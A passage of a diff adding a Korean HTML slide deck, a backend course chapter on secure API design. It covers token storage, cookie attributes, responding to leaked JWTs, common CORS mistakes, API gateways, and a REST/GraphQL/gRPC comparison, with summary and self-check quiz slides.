+        <p>클라이언트는 모르는 필드를 무시하도록 만들고, 옛 버전은 <code>Deprecation</code>, <code>Sunset</code> 헤더로 종료 일정을 알린 뒤 호출량을 보며 내립니다.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>토큰 저장 위치는 XSS와 CSRF의 교환이다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">저장 위치</th><th scope="col">XSS에</th><th scope="col">CSRF에</th><th scope="col">판단</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">localStorage</th><td class="is-key">스크립트로 바로 탈취</td><td>자동 전송 없어 안전</td><td>XSS 하나로 장기 토큰 유출</td></tr>
+        <tr><th scope="row">HttpOnly 쿠키</th><td class="is-flow">스크립트로 읽을 수 없음</td><td>자동 전송, 방어 필요</td><td>SameSite와 CSRF 토큰 병행</td></tr>
+        <tr><th scope="row">메모리(변수)</th><td>페이지 안에서만 노출</td><td>안전</td><td>새로고침 시 사라짐</td></tr>
+      </tbody>
+    </table>
+    <div class="prose">
+      <p>흔한 조합은 <mark>Access Token은 메모리에, Refresh Token은 HttpOnly 쿠키에</mark> 두는 것입니다. 새로고침하면 쿠키로 재발급 엔드포인트를 호출해 Access Token을 다시 받습니다. XSS가 있으면 어느 방식이든 그 세션 안에서는 요청을 대신 보낼 수 있으므로, 저장 위치는 피해 범위를 줄일 뿐 XSS 방어를 대신하지 않습니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>쿠키 속성 하나하나가 공격 하나씩을 막는다</h2>
+  <div class="split split--wide-left">
+    <div class="slide__body">
+      <pre class="code" data-file="응답 헤더"><code><span class="hl">Set-Cookie: __Secure-rt=8f3a...;</span>
+  Path=/auth/refresh;
+  Secure; HttpOnly;
+  SameSite=Strict;
+  Max-Age=<span class="n">1209600</span></code></pre>
+      <table class="compare">
+        <thead><tr><th scope="col">속성</th><th scope="col">막는 것</th></tr></thead>
+        <tbody>
+          <tr><th scope="row">Secure</th><td>평문 HTTP 전송으로 탈취</td></tr>
+          <tr><th scope="row">HttpOnly</th><td>XSS 스크립트의 읽기</td></tr>
+          <tr><th scope="row">SameSite</th><td>교차 사이트 요청에 첨부(CSRF)</td></tr>
+          <tr><th scope="row">Path</th><td>불필요한 엔드포인트로 전송</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="prose">
+      <p>Refresh Token 쿠키는 재발급 경로에만 가도록 <code>Path</code>를 좁히고, 14일(1209600초)처럼 수명을 명시합니다. <code>__Secure-</code> 접두사는 브라우저가 Secure 없는 설정을 거부하게 만듭니다.</p>
+      <p>2장에서 봤듯 SameSite가 없을 때 Lax로 취급하는 것은 Chromium 계열뿐이므로 <strong>항상 명시</strong>합니다. 프론트와 API가 다른 사이트라 <code>SameSite=None</code>이 필요하면 CSRF 방어를 따로 둡니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>토큰이 털렸을 때는 범위부터 끊는다</h2>
+  <div class="split split--even">
+    <ol class="steps">
+      <li class="is-key"><b>Refresh 폐기</b><p>해당 사용자의 토큰 계열을 모두 폐기해 재발급 통로를 닫습니다.</p></li>
+      <li><b>Access 차단</b><p>사용자별 토큰 버전을 올려 그 전에 발급된 토큰을 거절합니다.</p></li>
+      <li><b>키 교체</b><p>서명 키가 샜다면 새 kid로 교체하고 JWKS에서 옛 키를 내립니다.</p></li>
+      <li><b>경로 추적</b><p>발급 로그와 IP, User-Agent로 유출 경로와 영향 범위를 찾습니다.</p></li>
+      <li><b>재발 방지</b><p>XSS 수정, 만료 단축, 비밀번호 재설정 요구 등을 적용합니다.</p></li>
+    </ol>
+    <div class="prose">
+      <p>JWT를 무상태로만 운영하면 이 순간 할 수 있는 일이 "만료를 기다리기"뿐입니다. 그래서 평소에 <mark>토큰 버전이나 블랙리스트를 확인할 지점</mark>을 인증 필터에 미리 만들어 둡니다.</p>
+      <p>Access Token 수명이 짧을수록 2단계의 부담이 줄어듭니다. 수명은 탈취 시 감내할 시간과 재발급 트래픽 사이의 타협입니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>CORS 설정 실수는 대개 다섯 가지다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">실수</th><th scope="col">무슨 일이 생기나</th><th scope="col">고치는 법</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">요청 Origin을 그대로 반사</th><td class="is-key">credentials와 겹치면 아무 사이트나 응답을 읽음</td><td>허용 목록과 정확히 비교</td></tr>
+        <tr><th scope="row">접미사 정규식 매칭</th><td><code>evilshop.com</code>도 통과</td><td>스킴과 호스트 전체 비교</td></tr>
+        <tr><th scope="row"><code>null</code> 출처 허용</th><td>샌드박스 iframe에서 우회</td><td>null은 허용하지 않음</td></tr>
+        <tr><th scope="row">Vary: Origin 누락</th><td>CDN이 다른 출처 응답을 재사용</td><td>출처별 응답이면 Vary 추가</td></tr>
+        <tr><th scope="row">사전 요청에 401</th><td>인증 필터가 OPTIONS를 막음</td><td>CORS를 인증보다 먼저 처리</td></tr>
+      </tbody>
+    </table>
+    <p class="small">Spring Security에서는 <code>http.cors()</code>로 CORS 필터를 보안 체인 앞쪽에 두면, 인증 헤더가 없는 사전 요청이 401로 막히는 문제를 피할 수 있습니다.</p>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>API Gateway는 공통 관심사를 앞단에 모은다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p>서비스가 여럿으로 나뉘면 인증, TLS 종료, 라우팅, 요청 제한, 로깅을 서비스마다 반복하게 됩니다. <dfn>API Gateway</dfn>는 모든 외부 요청이 지나는 단일 입구에서 이것들을 한 번에 처리하는 리버스 프록시(2장)입니다.</p>
+      <p>Spring Cloud Gateway, Kong, AWS API Gateway(11장)가 대표적이고, 요청 제한 알고리즘은 8장에서 다룹니다.</p>
+    </div>
+    <div class="slide__body">
+      <aside class="callout callout--key">
+        <p class="callout__title"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 4l9 16H3z"/><path d="M12 10v4M12 17.5v.01"/></svg>비즈니스 로직은 넣지 마세요</p>
+        <p>게이트웨이는 모든 요청이 지나는 단일 장애점이 되기 쉽습니다. 얇게 유지하고 여러 대로 띄웁니다.</p>
+      </aside>
+      <div class="prose">
+        <p>게이트웨이가 JWT를 검증해도 내부 서비스가 인가를 생략하면 안 됩니다. 내부망이 안전하다는 가정은 쉽게 깨집니다.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>REST만이 답은 아니다: GraphQL과 gRPC</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">항목</th><th scope="col">REST</th><th scope="col">GraphQL</th><th scope="col">gRPC</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">엔드포인트</th><td>리소스마다</td><td>하나(/graphql)</td><td>서비스 메서드마다</td></tr>
+        <tr><th scope="row">응답 모양</th><td>서버가 정함</td><td class="is-flow">클라이언트가 필드 선택</td><td>.proto 스키마로 고정</td></tr>
+        <tr><th scope="row">전송</th><td>HTTP, 주로 JSON</td><td>HTTP, JSON</td><td class="is-flow">HTTP/2, Protobuf 바이너리</td></tr>
+        <tr><th scope="row">HTTP 캐시</th><td>쉬움</td><td class="is-key">어려움(대부분 POST)</td><td>해당 없음</td></tr>
+        <tr><th scope="row">어울리는 곳</th><td>공개 API, 범용</td><td>화면별 데이터가 다양한 앱</td><td>내부 서비스 간 호출</td></tr>
+      </tbody>
+    </table>
+    <p class="small">GraphQL은 필드마다 리졸버가 돌아 6장의 N+1 문제가 그대로 생기기 쉬워 DataLoader로 묶어 조회합니다. gRPC는 브라우저에서 직접 쓰기 어려워 gRPC-Web 같은 중계가 필요합니다.</p>
+  </div>
+</section>
+
+<!-- ===== 정리 ========================================================= -->
+<section class="slide slide--summary" data-section="정리" data-depth="none">
+  <h2>정리</h2>
+  <ul class="summary">
+    <li><b>API는 예측 가능해야 오래 버팁니다.</b> 리소스 중심 URI, 의미에 맞는 상태 코드, 표준 에러 포맷, 깨는 변경에만 버전을 올리는 규칙이 그 바탕입니다.</li>
+    <li><b>움직이는 데이터와 재시도를 설계에 넣습니다.</b> 깊은 목록은 cursor로, 결제 같은 POST는 Idempotency-Key로 결과를 고정합니다.</li>
+    <li><b>JWT는 서명 덕분에 무상태로 검증되지만 취소가 어렵습니다.</b> 짧은 Access, Rotation되는 Refresh, 블랙리스트로 빈틈을 메웁니다.</li>
+    <li><b>암호 도구는 보장 범위가 다릅니다.</b> 서명은 숨기지 않고, 비밀번호는 솔트와 느린 해시(bcrypt, Argon2id)로 저장합니다.</li>
+    <li><b>CORS는 보호막이 아니라 브라우저의 읽기 허가입니다.</b> XSS, CSRF, SQL Injection은 각각 출력 이스케이프, 예측 불가 토큰과 SameSite, 바인딩으로 막습니다.</li>
+  </ul>
+</section>
+
+<!-- ===== 부록: 스스로 점검 ============================================= -->
+<section class="slide" data-section="부록: 스스로 점검" data-depth="none">
+  <h2>스스로 점검 (1)</h2>
+  <ol class="selfcheck">
+    <li><details><summary>무한 스크롤 피드를 offset으로 만들면 어떤 문제가 보이나요?</summary>
+      <div class="answer"><p>스크롤하는 사이 새 글이 들어오면 이미 본 글이 다시 나오고, 깊이 내려갈수록 DB가 건너뛸 행을 읽느라 느려집니다. cursor 방식이 두 문제를 함께 풉니다.</p></div></details></li>
+    <li><details><summary>Idempotency-Key를 "조회 후 없으면 저장"으로 구현하면 왜 위험한가요?</summary>
+      <div class="answer"><p>동시에 도착한 두 요청이 모두 "없음"을 보고 결제를 실행할 수 있습니다. 유니크 제약 INSERT나 SET NX처럼 선점을 원자적으로 해야 합니다.</p></div></details></li>
+    <li><details><summary>JWT Payload의 role을 ADMIN으로 바꿔 보내면 어떻게 되나요?</summary>
+      <div class="answer"><p>서버가 Header.Payload로 서명을 다시 계산하면 받은 서명과 달라 거절됩니다. 다만 Payload 내용 자체는 누구나 읽을 수 있습니다.</p></div></details></li>
+    <li><details><summary>서비스 다섯 개가 토큰을 검증한다면 HS256보다 RS256이 나은 이유는?</summary>
+      <div class="answer"><p>HS256은 다섯 서비스 모두 발급 키를 가져 어느 하나가 털리면 토큰을 위조할 수 있습니다. RS256은 공개키만 배포하므로 발급 능력이 인증 서버에만 남습니다.</p></div></details></li>
+    <li><details><summary>SHA-256에 솔트만 붙이면 비밀번호 저장으로 충분한가요?</summary>
+      <div class="answer"><p>레인보우 테이블은 막지만 SHA-256이 너무 빨라 유출된 해시 하나하나에 대한 대입 공격은 여전히 빠릅니다. bcrypt나 Argon2id로 한 번의 계산 비용을 키워야 합니다.</p></div></details></li>
+  </ol>
+</section>
+
+<section class="slide" data-depth="none">
+  <h2>스스로 점검 (2)</h2>
+  <ol class="selfcheck">
+    <li><details><summary>Rotation 중 이미 쓴 Refresh Token이 다시 들어오면 왜 계열 전체를 폐기하나요?</summary>
+      <div class="answer"><p>정상 클라이언트는 최신 토큰만 쓰므로 재사용은 복사본이 있다는 신호입니다. 누가 진짜인지 서버가 구분할 수 없어 전부 끊고 재로그인을 요구합니다.</p></div></details></li>
+    <li><details><summary>PKCE가 없으면 공개 클라이언트에서 무엇이 위험한가요?</summary>
+      <div class="answer"><p>client_secret이 없으므로 리다이렉트 중 가로챈 code만으로 토큰을 받을 수 있습니다. PKCE는 원본 verifier를 요구해 이를 막습니다.</p></div></details></li>
+    <li><details><summary>CORS를 막아 두었는데 CSRF 공격이 성공했습니다. 어떻게 가능할까요?</summary>
+      <div class="answer"><p>폼 POST 같은 단순 요청은 사전 요청 없이 전송되고 쿠키도 붙습니다. CORS는 응답 읽기만 막으므로 CSRF 토큰이나 SameSite가 필요합니다.</p></div></details></li>
+    <li><details><summary>프론트에서만 "CORS 에러"가 나고 Postman으로는 잘 됩니다. 먼저 볼 곳은?</summary>
+      <div class="answer"><p>OPTIONS 사전 요청의 응답을 봅니다. 인증 필터가 OPTIONS를 401로 막거나 허용 헤더가 빠진 경우가 대부분입니다.</p></div></details></li>
+    <li><details><summary>MyBatis에서 정렬 컬럼을 ${sort}로 받으면 무엇이 문제인가요?</summary>
+      <div class="answer"><p>${}는 문자열 치환이라 입력이 SQL 문법이 되어 Injection이 가능합니다. 컬럼명은 바인딩할 수 없으므로 허용 목록으로 검사한 값만 넣습니다.</p></div></details></li>
+  </ol>
+</section>
+
+<!-- ===== 다음 장 ====================================================== -->
+<section class="slide" data-section="다음 단계" data-depth="none">
+  <h2>다음으로 올라갈 층</h2>
+  <div class="slide__body">
+    <p class="lede">서버 한 대 위의 API를 안전하게 만들었습니다. 이제 이 API가 초당 수만 건을 받을 때 무엇이 무너지는지, 무상태 서버와 캐시, 메시지 큐, 요청 제한으로 어떻게 버티는지 대규모 시스템 설계로 넘어갑니다.</p>
+    <div class="nav-pair">
+      <a class="next" href="08-system-design.html">
+        <span class="next__text">
+          <span class="next__label">다음 장</span>
+          <span class="next__title">8장 대규모 시스템 설계</span>
+          <span class="next__desc">확장, 캐시, 메시지 큐, 장애 격리로 트래픽을 견디는 법</span>
+        </span>
+        <div class="stackmap stackmap--mini" data-current="8"></div>
+      </a>
+      <a class="next next--prev" href="06-spring-jpa.html">
+        <span class="next__text">
+          <span class="next__label">이전 장</span>
+          <span class="next__title">6장 Spring과 JPA</span>
+        </span>
+      </a>
+    </div>
+    <p class="small"><a href="index.html">전체 학습 지도로 돌아가기</a></p>
+  </div>
+</section>
+
+</main>
+<script src="assets/deck.js"></script>
+</body>
+</html>
